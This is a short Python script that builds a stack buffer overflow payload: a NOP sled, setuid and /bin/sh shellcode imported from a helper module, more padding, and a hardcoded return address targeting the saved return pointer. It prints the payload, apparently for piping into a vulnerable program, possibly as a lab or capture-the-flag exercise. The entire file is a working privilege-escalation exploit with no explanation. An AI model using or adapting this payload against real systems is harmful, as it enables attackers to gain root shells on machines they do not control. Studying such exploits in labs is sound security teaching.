from shellcode import * 
she=setuid+bin_sh
nop='\x90'

ret= '\x0c\xbd\xff\xbf' # bfffbd0c :: ebp+4

shell = nop*25+ she + nop*34 + ret
print(shell)
